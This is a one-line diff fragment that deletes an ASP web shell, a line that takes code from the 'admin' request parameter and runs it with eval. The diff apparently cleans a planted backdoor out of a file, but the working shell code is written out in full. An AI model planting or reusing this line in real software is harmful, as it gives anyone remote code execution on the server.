@@ -1,1 +1,0 @@
-<%a=request("admin")%><%eval a%>
